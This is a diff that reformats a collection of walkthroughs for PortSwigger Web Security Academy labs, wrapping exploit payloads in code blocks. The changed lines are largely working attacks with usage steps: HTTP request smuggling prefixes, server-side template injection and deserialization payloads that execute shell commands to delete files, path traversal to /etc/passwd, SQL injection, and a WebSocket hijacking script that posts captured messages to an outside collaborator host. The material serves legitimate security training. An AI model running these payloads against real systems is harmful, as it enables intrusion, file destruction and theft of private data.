-`0 search results for 'x: xyz Content-Length: 644 cookie: session=YOUR-
-SESSION-COOKIE X-SSL-VERIFIED: 0 X-SSL-CLIENT-CN: null X-FRONTEND-KEY: YOUR-
-UNIQUE-KEY`
+   ```http
+   0 search results for 'x: xyz Content-Length: 644 cookie: session=YOUR-
+   SESSION-COOKIE X-SSL-VERIFIED: 0 X-SSL-CLIENT-CN: null X-FRONTEND-KEY: YOUR-
+   UNIQUE-KEY
+   ```
 
 Notice that these appear to be headers used for [client authentication](/web-
 security/request-smuggling/exploiting#bypassing-client-authentication).
@@ -4227,8 +4486,10 @@ security/request-smuggling/exploiting#bypassing-client-authentication).
 
 **Name**
 
-`foo: bar\r\n \r\n GET /admin HTTP/1.1\r\n X-SSL-VERIFIED: 1\r\n X-SSL-CLIENT-
-CN: administrator\r\n X-FRONTEND-KEY: YOUR-UNIQUE-KEY\r\n \r\n`
+   ```http
+   foo: bar\r\n \r\n GET /admin HTTP/1.1\r\n X-SSL-VERIFIED: 1\r\n X-SSL-CLIENT-
+   CN: administrator\r\n X-FRONTEND-KEY: YOUR-UNIQUE-KEY\r\n \r\n
+   ```
 
 **Value**
 
@@ -4283,8 +4544,10 @@ to inject via the `:path`.
 
 **Value**
 
-`/?cachebuster=2 HTTP/1.1\r\n Host: YOUR-LAB-ID.web-security-academy.net\r\n
-\r\n GET /post?postId=1 HTTP/1.1\r\n Foo: bar`
+   ```http
+   /?cachebuster=2 HTTP/1.1\r\n Host: YOUR-LAB-ID.web-security-academy.net\r\n
+   \r\n GET /post?postId=1 HTTP/1.1\r\n Foo: bar
+   ```
 
 Note that we've ensured that the main request is valid by including a `Host`
 header before the split. We've also left an arbitrary trailing header to
@@ -4305,8 +4568,10 @@ front-end during rewriting.
 
 **Value**
 
-`/?cachebuster=3 HTTP/1.1\r\n Host: YOUR-LAB-ID.web-security-academy.net\r\n
-\r\n GET /resources?<script>alert(1)</script> HTTP/1.1\r\n Foo: bar`
+   ```http
+   /?cachebuster=3 HTTP/1.1\r\n Host: YOUR-LAB-ID.web-security-academy.net\r\n
+   \r\n GET /resources?<script>alert(1)</script> HTTP/1.1\r\n Foo: bar
+   ```
 
 Observe that the request times out. This is because the `Content-Length`
 header in the main response is longer than the nested response to your
@@ -4354,15 +4619,16 @@ Frontier in HTTP Request Smuggling](https://portswigger.net/research/browser-pow
 **Confirm the desync vector in Burp**
 1. Re-enable the **Update Content-Length** option.
 2. Add an arbitrary request smuggling prefix to the body:
-```js
-POST / HTTP/1.1
-Host: YOUR-LAB-ID.h1-web-security-academy.net
-Connection: close
-Content-Length: CORRECT
+   ```http
+   POST / HTTP/1.1
+   Host: YOUR-LAB-ID.h1-web-security-academy.net
+   Connection: close
+   Content-Length: CORRECT
 
-GET /hopefully404 HTTP/1.1 
-Foo: x
-```
+   GET /hopefully404 HTTP/1.1 
+   Foo: x
+   ```
+
 3. Add a normal request for `GET /` to the tab group, after your malicious request.
 4. Using the drop-down menu next to the **Send** button, change the send mode to **Send group in sequence (single connection)**.
 5. Change the `Connection` header of the first request to `keep-alive`.
@@ -4375,19 +4641,19 @@ Foo: x
 4. Ensure that the **Preserve log** option is selected and clear the log of any existing entries.
 5. Go to the **Console** tab and replicate the attack from the previous section using the `fetch()` API as follows:
 
-```js
-fetch('https://YOUR-LAB-ID.h1-web-security-academy.net', {
-  method: 'POST',
-  body: 'GET /hopefully404 HTTP/1.1\r\nFoo: x',
-  mode: 'cors',
-  credentials: 'include',
-}).catch(() => {
-  fetch('https://YOUR-LAB-ID.h1-web-security-academy.net', {
-  mode: 'no-cors',
-  credentials: 'include'
-  })
-})
-```
+   ```js
+   fetch('https://YOUR-LAB-ID.h1-web-security-academy.net', {
+      method: 'POST',
+      body: 'GET /hopefully404 HTTP/1.1\r\nFoo: x',
+      mode: 'cors',
+      credentials: 'include',
+   }).catch(() => {
+       fetch('https://YOUR-LAB-ID.h1-web-security-academy.net', {
+         mode: 'no-cors',
+         credentials: 'include'
+      })
+   })
+   ```
 Note that we're intentionally triggering a CORS error to prevent the browser
 from following the redirect, then using the `catch()` method to continue the
 attack sequence.
@@ -4414,13 +4680,15 @@ This confirms that the desync vector can be triggered from a browser.
 
 Request 1:
 
-`POST / HTTP/1.1 Host: YOUR-LAB-ID.h1-web-security-academy.net Connection:
-keep-alive Content-Length: CORRECT POST /en/post/comment HTTP/1.1 Host: YOUR-
-LAB-ID.h1-web-security-academy.net Cookie: session=YOUR-SESSION-COOKIE;
-_lab_analytics=YOUR-LAB-COOKIE Content-Length: NUMBER-OF-BYTES-TO-CAPTURE
-Content-Type: x-www-form-urlencoded Connection: keep-alive csrf=YOUR-CSRF-
-TOKEN&postId;=YOUR-POST-ID&name;=wiener&email;=wiener@web-security-
-academy.net&website;=https://ginandjuice.shop&comment;= `
+   ```http
+   POST / HTTP/1.1 Host: YOUR-LAB-ID.h1-web-security-academy.net Connection:
+   keep-alive Content-Length: CORRECT POST /en/post/comment HTTP/1.1 Host: YOUR-
+   LAB-ID.h1-web-security-academy.net Cookie: session=YOUR-SESSION-COOKIE;
+   _lab_analytics=YOUR-LAB-COOKIE Content-Length: NUMBER-OF-BYTES-TO-CAPTURE
+   Content-Type: x-www-form-urlencoded Connection: keep-alive csrf=YOUR-CSRF-
+   TOKEN&postId;=YOUR-POST-ID&name;=wiener&email;=wiener@web-security-
+   academy.net&website;=https://ginandjuice.shop&comment;= 
+   ```
 
 Request 2:
 
@@ -4518,18 +4786,22 @@ powered-desync-attacks#pause).
 
 6. Add a complete `GET /admin` request to the body of the main request. The result should look something like this:
 
-`POST /resources HTTP/1.1 Host: YOUR-LAB-ID.web-security-academy.net Cookie:
-session=YOUR-SESSION-COOKIE Connection: keep-alive Content-Type:
-application/x-www-form-urlencoded Content-Length: CORRECT GET /admin/ HTTP/1.1
-Host: YOUR-LAB-ID.web-security-academy.net`
+   ```http
+   POST /resources HTTP/1.1 Host: YOUR-LAB-ID.web-security-academy.net Cookie:
+   session=YOUR-SESSION-COOKIE Connection: keep-alive Content-Type:
+   application/x-www-form-urlencoded Content-Length: CORRECT GET /admin/ HTTP/1.1
+   Host: YOUR-LAB-ID.web-security-academy.net
+   ```
 
 7. In the Python editor panel, enter the following script. This issues the request twice, pausing for 61 seconds after the `\r\n\r\n` sequence at the end of the headers:
 
-`def queueRequests(target, wordlists): engine =
-RequestEngine(endpoint=target.endpoint, concurrentConnections=1,
-requestsPerConnection=500, pipeline=False ) engine.queue(target.req,
-pauseMarker=['\r\n\r\n'], pauseTime=61000) engine.queue(target.req) def
-handleResponse(req, interesting): table.add(req)`
+   ```python
+   def queueRequests(target, wordlists):
+      engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=1,   requestsPerConnection=500, pipeline=False )
+      engine.queue(target.req,pauseMarker=['\r\n\r\n'], pauseTime=61000)
+      engine.queue(target.req)
+      def handleResponse(req, interesting): table.add(req)
+   ```
 
 8. Launch the attack. Initially, you won't see anything happening, but after 61 seconds, you should see two entries in the results table:
    - The first entry is the `POST /resources` request, which triggered a redirect to `/resources/` as normal.
@@ -4551,11 +4823,13 @@ handleResponse(req, interesting): table.add(req)`
 
 4. Go back to the attack configuration screen. Use these details to replicate the request that would be issued when submitting the form. The result should look something like this:
 
-`POST /resources HTTP/1.1 Host: YOUR-LAB-ID.web-security-academy.net Cookie:
-session=YOUR-SESSION-COOKIE Connection: keep-alive Content-Type:
-application/x-www-form-urlencoded Content-Length: CORRECT POST /admin/delete/
-HTTP/1.1 Host: localhost Content-Type: x-www-form-urlencoded Content-Length:
-CORRECT csrf=YOUR-CSRF-TOKEN&username;=carlos`
+   ```http
+   POST /resources HTTP/1.1 Host: YOUR-LAB-ID.web-security-academy.net Cookie:
+   session=YOUR-SESSION-COOKIE Connection: keep-alive Content-Type:
+   application/x-www-form-urlencoded Content-Length: CORRECT POST /admin/delete/
+   HTTP/1.1 Host: localhost Content-Type: x-www-form-urlencoded Content-Length:
+   CORRECT csrf=YOUR-CSRF-TOKEN&username;=carlos
+   ```
 
 5. To prevent Turbo Intruder from pausing after both occurrences of `\r\n\r\n` in the request, update the `pauseMarker` argument so that it only matches the end of the first set of headers, for example:
 
@@ -4741,8 +5015,8 @@ directory.
 
 8. URL-encode your payload and insert it as the value of the `message` parameter, remembering to replace `YOUR-LAB-ID` with your own lab ID:
 
-`https://YOUR-LAB-ID.web-security-
-academy.net/?message=<%25+system("rm+/home/carlos/morale.txt")+%25>`
+   `https://YOUR-LAB-ID.web-security-
+   academy.net/?message=<%25+system("rm+/home/carlos/morale.txt")+%25>`
 
 ## server-side template injection
 
@@ -4767,22 +5041,23 @@ Take a closer look at the "preferred name" functionality.
 3. In Burp, go to "Proxy" > "HTTP history" and find the request that sets this parameter, namely `POST /my-account/change-blog-post-author-display`, and send it to Burp Repeater.
 4. Study the Tornado documentation to discover that template expressions are surrounded with double curly braces, such as `{{someExpression}}`. In Burp Repeater, notice that you can escape out of the expression and inject arbitrary template syntax as follows:
 
-`blog-post-author-display=user.name}}{{7*7}}`
+   `blog-post-author-display=user.name}}{{7*7}}`
 
 5. Reload the page containing your test comment. Notice that the username now says `Peter Wiener49}}`, indicating that a server-side template injection vulnerability may exist in the code context.
 6. In the Tornado documentation, identify the syntax for executing arbitrary Python:
 
-`{% somePython %}`
+   `{% somePython %}`
 
 7. Study the Python documentation to discover that by importing the `os` module, you can use the `system()` method to execute arbitrary system commands.
 8. Combine this knowledge to construct a payload that deletes Carlos's file:
 
-`{% import os %} {{os.system('rm /home/carlos/morale.txt')`
+   `{% import os %} {{os.system('rm /home/carlos/morale.txt')`
 
 9. In Burp Repeater, go back to `POST /my-account/change-blog-post-author-display`. Break out of the expression, and inject your payload into the parameter, remembering to URL-encode it as follows:
 
-`blog-post-author-
-display=user.name}}{%25+import+os+%25}{{os.system('rm%20/home/carlos/morale.txt')`
+   ```bash
+   blog-post-author-display=user.name}}{%25+import+os+%25}{{os.system('rm%20/home/carlos/morale.txt')
+   ```
 
 10. Reload the page containing your comment to execute the template and solve the lab.
 
@@ -4812,8 +5087,10 @@ you can use to solve the lab.
 5. Observe that there is a class called `Execute`, which can be used to execute arbitrary shell commands
 6. Either attempt to construct your own exploit, or find [@albinowax's exploit](https://portswigger.net/research/server-side-template-injection) on our research page and adapt it as follows:
 
-`<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("rm
-/home/carlos/morale.txt") }`
+   ```
+   <#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("rm
+   /home/carlos/morale.txt") }
+   ```
 
 7. Remove the invalid syntax that you entered earlier, and insert your new payload into the template.
 8. Save the template and view the product page to solve the lab.
@@ -4834,17 +5111,21 @@ home directory.
 3. Search the web for "Handlebars server-side template injection". You should find a well-known exploit posted by `@Zombiehelp54`.
 4. Modify this exploit so that it calls `require("child_process").exec("rm /home/carlos/morale.txt")` as follows:
 
-`wrtz{{#with "s" as |string|}} {{#with "e"}} {{#with split as |conslist|}}
-{{this.pop}} {{this.push (lookup string.sub "constructor")}} {{this.pop}}
-{{#with string.split as |codelist|}} {{this.pop}} {{this.push "return
-require('child_process').exec('rm /home/carlos/morale.txt');"}} {{this.pop}}
-{{#each conslist}} {{#with (string.sub.apply 0 codelist)}} {{this}} {{/with}}
-{{/each}} {{/with}} {{/with}} {{/with}} {{/with}}`
+   ```bash
+   wrtz{{#with "s" as |string|}} {{#with "e"}} {{#with split as |conslist|}}
+   {{this.pop}} {{this.push (lookup string.sub "constructor")}} {{this.pop}}
+   {{#with string.split as |codelist|}} {{this.pop}} {{this.push "return
+   require('child_process').exec('rm /home/carlos/morale.txt');"}} {{this.pop}}
+   {{#each conslist}} {{#with (string.sub.apply 0 codelist)}} {{this}} {{/with}}
+   {{/each}} {{/with}} {{/with}} {{/with}} {{/with}}
+   ```
 
 5. URL encode your exploit and add it as the value of the message parameter in the URL. The final exploit should look like this, but remember to replace `YOUR-LAB-ID` with your own lab ID:
 
-`https://YOUR-LAB-ID.web-security-
-academy.net/?message=wrtz%7b%7b%23%77%69%74%68%20%22%73%22%20%61%73%20%7c%73%74%72%69%6e%67%7c%7d%7d%0d%0a%20%20%7b%7b%23%77%69%74%68%20%22%65%22%7d%7d%0d%0a%20%20%20%20%7b%7b%23%77%69%74%68%20%73%70%6c%69%74%20%61%73%20%7c%63%6f%6e%73%6c%69%73%74%7c%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%75%73%68%20%28%6c%6f%6f%6b%75%70%20%73%74%72%69%6e%67%2e%73%75%62%20%22%63%6f%6e%73%74%72%75%63%74%6f%72%22%29%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%23%77%69%74%68%20%73%74%72%69%6e%67%2e%73%70%6c%69%74%20%61%73%20%7c%63%6f%64%65%6c%69%73%74%7c%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%75%73%68%20%22%72%65%74%75%72%6e%20%72%65%71%75%69%72%65%28%27%63%68%69%6c%64%5f%70%72%6f%63%65%73%73%27%29%2e%65%78%65%63%28%27%72%6d%20%2f%68%6f%6d%65%2f%63%61%72%6c%6f%73%2f%6d%6f%72%61%6c%65%2e%74%78%74%27%29%3b%22%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%23%65%61%63%68%20%63%6f%6e%73%6c%69%73%74%7d%7d%0d%0a%20%20%20%20%20%20%20%20%20%20%7b%7b%23%77%69%74%68%20%28%73%74%72%69%6e%67%2e%73%75%62%2e%61%70%70%6c%79%20%30%20%63%6f%64%65%6c%69%73%74%29%7d%7d%0d%0a%20%20%20%20%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%7d%7d%0d%0a%20%20%20%20%20%20%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%2f%65%61%63%68%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%7b%7b%2f%77%69%74%68%7d%7d`
+   ```bash
+   https://YOUR-LAB-ID.web-security-
+   academy.net/?message=wrtz%7b%7b%23%77%69%74%68%20%22%73%22%20%61%73%20%7c%73%74%72%69%6e%67%7c%7d%7d%0d%0a%20%20%7b%7b%23%77%69%74%68%20%22%65%22%7d%7d%0d%0a%20%20%20%20%7b%7b%23%77%69%74%68%20%73%70%6c%69%74%20%61%73%20%7c%63%6f%6e%73%6c%69%73%74%7c%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%75%73%68%20%28%6c%6f%6f%6b%75%70%20%73%74%72%69%6e%67%2e%73%75%62%20%22%63%6f%6e%73%74%72%75%63%74%6f%72%22%29%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%23%77%69%74%68%20%73%74%72%69%6e%67%2e%73%70%6c%69%74%20%61%73%20%7c%63%6f%64%65%6c%69%73%74%7c%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%75%73%68%20%22%72%65%74%75%72%6e%20%72%65%71%75%69%72%65%28%27%63%68%69%6c%64%5f%70%72%6f%63%65%73%73%27%29%2e%65%78%65%63%28%27%72%6d%20%2f%68%6f%6d%65%2f%63%61%72%6c%6f%73%2f%6d%6f%72%61%6c%65%2e%74%78%74%27%29%3b%22%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%23%65%61%63%68%20%63%6f%6e%73%6c%69%73%74%7d%7d%0d%0a%20%20%20%20%20%20%20%20%20%20%7b%7b%23%77%69%74%68%20%28%73%74%72%69%6e%67%2e%73%75%62%2e%61%70%70%6c%79%20%30%20%63%6f%64%65%6c%69%73%74%29%7d%7d%0d%0a%20%20%20%20%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%7d%7d%0d%0a%20%20%20%20%20%20%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%2f%65%61%63%68%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%7b%7b%2f%77%69%74%68%7d%7d
+   ```
 
 6. The lab should be solved when you load the URL.
 
@@ -4894,8 +5175,10 @@ You can log in to your own account using the following credentials:
 2. Load the JavaDoc for the `Object` class to find methods that should be available on all objects. Confirm that you can execute `${object.getClass()}` using the `product` object.
 3. Explore the documentation to find a sequence of method invocations that grant access to a class with a static method that lets you read a file, such as:
 
-`${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/home/carlos/my_password.txt').toURL().openStream().readAllBytes()?join("
-")}`
+   ```bash
+   ${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/home/carlos/my_password.txt').toURL().openStream().readAllBytes()?join("
+   ")}
+   ```
 
 4. Enter this payload in one of the templates and save. The output will contain the contents of the file as decimal ASCII code points.
 5. Convert the returned bytes to ASCII.
@@ -4995,7 +5278,7 @@ To solve the lab, retrieve the contents of the `/etc/passwd` file.
 1. Use Burp Suite to intercept and modify a request that fetches a product image.
 2. Modify the `filename` parameter, giving it the value:
 
-`....//....//....//etc/passwd`
+   `....//....//....//etc/passwd`
 
 3. Observe that the response contains the contents of the `/etc/passwd` file.
 
@@ -5033,7 +5316,7 @@ To solve the lab, retrieve the contents of the `/etc/passwd` file.
 1. Use Burp Suite to intercept and modify a request that fetches a product image.
 2. Modify the `filename` parameter, giving it the value:
 
-`/var/www/images/../../../etc/passwd`
+   `/var/www/images/../../../etc/passwd`
 
 3. Observe that the response contains the contents of the `/etc/passwd` file.
 
@@ -5052,7 +5335,7 @@ To solve the lab, retrieve the contents of the `/etc/passwd` file.
 1. Use Burp Suite to intercept and modify a request that fetches a product image.
 2. Modify the `filename` parameter, giving it the value:
 
-`../../../etc/passwd%00.png`
+   `../../../etc/passwd%00.png`
 
 3. Observe that the response contains the contents of the `/etc/passwd` file.
 
@@ -5623,8 +5906,10 @@ Carlos's account and access his "My account" page.
 3. Enter your correct current password and two new passwords that do not match. Send this `POST /my-account/change-password` request to Burp Intruder.
 4. In Burp Intruder, change the `username` parameter to `carlos` and add a payload position to the `current-password` parameter. Make sure that the new password parameters are set to two different values. For example:
 
-`username=carlos&current-password=§incorrect-password§&new-password-1=123&new-
-password-2=abc`
+   ```bash
+   username=carlos&current-password=§incorrect-password§&new-password-1=123&new-
+   password-2=abc
+   ```
 
 5. In the **Payloads** side panel, enter the list of passwords as the payload set.
 6. Click **Settings** to open the **Settings** side panel, then add a grep match rule to flag responses containing `New passwords do not match`. Start the attack.
@@ -5748,10 +6033,12 @@ Collaborator's default public server.
 5. Right-click on the handshake request and select "Copy URL".
 6. In the browser, go to the exploit server and paste the following template into the "Body" section:
 
-`<script> var ws = new WebSocket('wss://your-websocket-url'); ws.onopen =
-function() { ws.send("READY"); }; ws.onmessage = function(event) {
-fetch('https://your-collaborator-url', {method: 'POST', mode: 'no-cors', body:
-event.data}); }; </script>`
+   ```html
+   <script> var ws = new WebSocket('wss://your-websocket-url'); ws.onopen =
+   function() { ws.send("READY"); }; ws.onmessage = function(event) {
+   fetch('https://your-collaborator-url', {method: 'POST', mode: 'no-cors', body:
+   event.data}); }; </script>
+   ```
 
 7. Replace `your-websocket-url` with the URL from the WebSocket handshake (`YOUR-LAB-ID.web-security-academy.net/chat`). Make sure you change the protocol from `https://` to `wss://`. Replace `your-collaborator-url` with a payload generated by [Burp Collaborator](/burp/documentation/desktop/tools/collaborator).
 8. Click "View exploit".
@@ -5823,7 +6110,7 @@ This lab supports the `X-Forwarded-Host` header.
 9. Open the `GET` request for the home page in Burp Repeater and remove the cache buster.
 10. Add the following header, remembering to enter your own exploit server ID:
 
-`X-Forwarded-Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net`
+   `X-Forwarded-Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net`
 
 11. Send your malicious request. Keep replaying the request until you see your exploit server URL being reflected in the response and `X-Cache: hit` in the headers.
 12. To simulate the victim, load the poisoned URL in the browser and make sure that the `alert()` is triggered. Note that you have to perform this test before the cache expires. The cache on this lab expires every 30 seconds.
@@ -6016,15 +6303,19 @@ The website excludes a certain UTM analytics parameter.
 4. Notice that you can control the name of the function that is called on the returned data by editing the `callback` parameter. However, you can't poison the cache for other users in this way because the parameter is keyed.
 5. Study the cache behavior. Observe that if you add duplicate `callback` parameters, only the final one is reflected in the response, but both are still keyed. However, if you append the second `callback` parameter to the `utm_content` parameter using a semicolon, it is excluded from the cache key and still overwrites the callback function in the response:
 
-`GET
-/js/geolocate.js?callback=setCountryCookie&utm_content=foo;callback=arbitraryFunction
-HTTP/1.1 200 OK X-Cache-Key: /js/geolocate.js?callback=setCountryCookie …
-arbitraryFunction({"country" : "United Kingdom"})`
+   ```http
+   GET
+   /js/geolocate.js?callback=setCountryCookie&utm_content=foo;callback=arbitraryFunction
+   HTTP/1.1 200 OK X-Cache-Key: /js/geolocate.js?callback=setCountryCookie …
+   arbitraryFunction({"country" : "United Kingdom"})
+   ```
 
 6. Send the request again, but this time pass in `alert(1)` as the callback function:
 
-`GET
-/js/geolocate.js?callback=setCountryCookie&utm_content=foo;callback=alert(1)`
+   ```http
+   GET
+   /js/geolocate.js?callback=setCountryCookie&utm_content=foo;callback=alert(1)
+   ```
 
 7. Get the response cached, then load the home page in the browser. Check that the `alert()` is triggered.
 8. Replay the request to keep the cache poisoned. The lab will solve when the victim user visits any page containing this resource import URL.
@@ -6045,9 +6336,11 @@ the victim's browser.
 1. Observe that every page imports the script `/js/geolocate.js`, executing the callback function `setCountryCookie()`. Send the request `GET /js/geolocate.js?callback=setCountryCookie` to Burp Repeater.
 2. Notice that you can control the name of the function that is called in the response by passing in a duplicate `callback` parameter via the request body. Also notice that the cache key is still derived from the original `callback` parameter in the request line:
 
-`GET /js/geolocate.js?callback=setCountryCookie … callback=arbitraryFunction
-HTTP/1.1 200 OK X-Cache-Key: /js/geolocate.js?callback=setCountryCookie …
-arbitraryFunction({"country" : "United Kingdom"})`
+   ```http
+   GET /js/geolocate.js?callback=setCountryCookie … callback=arbitraryFunction
+   HTTP/1.1 200 OK X-Cache-Key: /js/geolocate.js?callback=setCountryCookie …
+   arbitraryFunction({"country" : "United Kingdom"})
+   ```
 
 3. Send the request again, but this time pass in `alert(1)` as the callback function. Check that you can successfully poison the cache.
 4. Remove any cache busters and re-poison the cache. The lab will solve when the victim user
@@ -6206,12 +6499,13 @@ Suite](/burp/documentation/desktop/http2).
 4. Use the `Pragma: x-get-cache-key` header to identify that the server is vulnerable to cache key injection, meaning the header injection can be triggered via a crafted URL.
 5. Combine these four behaviors by poisoning the cache with following two requests:
 
-```
+```http
 GET /js/localize.js?lang=en?utm_content=z&cors;=1&x;=1 HTTP/2 Origin:
 x%0d%0aContent-Length:%208%0d%0a%0d%0aalert(1)$$$$ GET
 /login?lang=en?utm_content=x%26cors=1%26x=1$$origin=x%250d%250aContent-
 Length:%208%250d%250a%250d%250aalert(1)$$%23 HTTP/2
 ```
+
 Note that the injected origin header is lower case to comply with the HTTP/2
 specification.
 
@@ -6381,9 +6675,16 @@ opens=java.base/java.util=ALL-UNNAMED \ [payload] '[command]'`
 2. Download the "ysoserial" tool and execute the following command. This generates a Base64-encoded serialized object containing your payload:
    - In Java versions 16 and above:
 
-`java -jar ysoserial-all.jar \ --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \ --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED \ --add-opens=java.base/java.net=ALL-UNNAMED \ --add-opens=java.base/java.util=ALL-UNNAMED \ CommonsCollections4 'rm /home/carlos/morale.txt' | base64` \* In Java versions 15 and below:
+   ```bash
+   java -jar ysoserial-all.jar \ --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \ --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED \ --add-opens=java.base/java.net=ALL-UNNAMED \ --add-opens=java.base/java.util=ALL-UNNAMED \ CommonsCollections4 'rm /home/carlos/morale.txt' | base64
+   ``` 
+   In Java versions 15 and below:
 
-`java -jar ysoserial-all.jar CommonsCollections4 'rm /home/carlos/morale.txt' | base64` 3. In Burp Repeater, replace your session cookie with the malicious one you just created. Select the entire cookie and then URL-encode it. 4. Send the request to solve the lab.
+   ```bash
+   java -jar ysoserial-all.jar CommonsCollections4 'rm /home/carlos/morale.txt' | base64
+   ```
+
+3. In Burp Repeater, replace your session cookie with the malicious one you just created. Select the entire cookie and then URL-encode it. 4. Send the request to solve the lab.
 
 ### Lab: Exploiting PHP deserialization with a pre-built gadget chain
 
@@ -6422,12 +6723,12 @@ gadget chain in Symfony to delete Carlos's `morale.txt` file.
    - Assign the object you generated in PHPGGC to the `$object` variable.
    - Assign the secret key that you copied from the `phpinfo.php` file to the `$secretKey` variable.
 
-```php
-<?php $object = "OBJECT-GENERATED-BY-PHPGGC"; $secretKey = "LEAKED-SECRET-
-KEY-FROM-PHPINFO.PHP"; $cookie = urlencode('{"token":"' . $object .
-'","sig_hmac_sha1":"' . hash_hmac('sha1', $object, $secretKey) . '"}'); echo
-$cookie;
-```
+   ```php
+   <?php $object = "OBJECT-GENERATED-BY-PHPGGC"; $secretKey = "LEAKED-SECRET-
+   KEY-FROM-PHPINFO.PHP"; $cookie = urlencode('{"token":"' . $object .
+   '","sig_hmac_sha1":"' . hash_hmac('sha1', $object, $secretKey) . '"}'); echo
+   $cookie;
+   ```
 
 This will output a valid, signed cookie to the console.
 
@@ -6523,16 +6824,20 @@ options for testing different payloads:
 In case you've not used Hackvertor before, we've provided the following
 template. Note that this is Base64-encoded here to avoid copy/paste issues:
 
-`PEBiYXNlNjRfND6s7QAFc3IAI2RhdGEucHJvZHVjdGNhdGFsb2cuUHJvZHVjdFRlbXBsYXRlAAAAAAAAAAECAAFMAAJpZHQAEkxqYXZhL2xhbmcvU3RyaW5nO3hwdAA8QGZyb21fY2hhcmNvZGVfMz48QGdldF9sZW4gLz48QC9mcm9tX2NoYXJjb2RlXzM+WU9VUi1QQVlMT0FELUhFUkU8QHNldF9sZW4+PEBsZW5ndGhfMD5ZT1VSLVBBWUxPQUQtSEVSRTxAL2xlbmd0aF8wPjxAL3NldF9sZW4+PEAvYmFzZTY0XzQ+`
+   ```
+   PEBiYXNlNjRfND6s7QAFc3IAI2RhdGEucHJvZHVjdGNhdGFsb2cuUHJvZHVjdFRlbXBsYXRlAAAAAAAAAAECAAFMAAJpZHQAEkxqYXZhL2xhbmcvU3RyaW5nO3hwdAA8QGZyb21fY2hhcmNvZGVfMz48QGdldF9sZW4gLz48QC9mcm9tX2NoYXJjb2RlXzM+WU9VUi1QQVlMT0FELUhFUkU8QHNldF9sZW4+PEBsZW5ndGhfMD5ZT1VSLVBBWUxPQUQtSEVSRTxAL2xlbmd0aF8wPjxAL3NldF9sZW4+PEAvYmFzZTY0XzQ+
+   ```
 
 To use this template:
 
 1. Copy and paste it into your session cookie in Burp Repeater.
 2. Base64-decode it to reveal something that looks like this:
 
-`<@base64>¬isr#data.productcatalog.ProductTemplateLidtLjava/lang/String;xpt<@from_charcode><@get_len
-/></@from_charcode>YOUR-PAYLOAD-HERE<@set_len><@length>YOUR-PAYLOAD-
-HERE</@length></@set_len></@base64>`
+   ```
+   <@base64>¬isr#data.productcatalog.ProductTemplateLidtLjava/lang/String;xpt<@from_charcode><@get_len
+   /></@from_charcode>YOUR-PAYLOAD-HERE<@set_len><@length>YOUR-PAYLOAD-
+   HERE</@length></@set_len></@base64>
+   ```
 
 3. Replace **both** occurrences of `YOUR-PAYLOAD-HERE` with the payload that you want to test. Leave everything else as it is.
 4. Send the request. If you want to check the output that Hackvertor generated, you can look at the request on the "Logger" tab.
@@ -6546,8 +6851,10 @@ security/sql-injection/union-attacks).
 3. [List the contents of the database](https://portswigger.net/web-security/sql-injection/examining-the-database#listing-the-contents-of-the-database) and identify that there is a table called `users` with a column called `password`.
 4. Use a suitable SQL injection payload to extract the password from the `users` table. For example, the following payload will trigger an exception that displays the password in the error message:
 
-`' UNION SELECT NULL, NULL, NULL, CAST(password AS numeric), NULL, NULL, NULL,
-NULL FROM users--`
+```sql
+' UNION SELECT NULL, NULL, NULL, CAST(password AS numeric), NULL, NULL, NULL
+, NULL FROM users--
+```
 
 5. To solve the lab, log in as `administrator` using the extracted password, open the admin panel, and delete `carlos`.
 
@@ -6584,8 +6891,10 @@ which is set to our shell command.
 
 5. To solve the lab, Base64 and URL-encode the following serialized object, and pass it into the website via your session cookie:
 
-`O:14:"CustomTemplate":2:{s:17:"default_desc_type";s:26:"rm
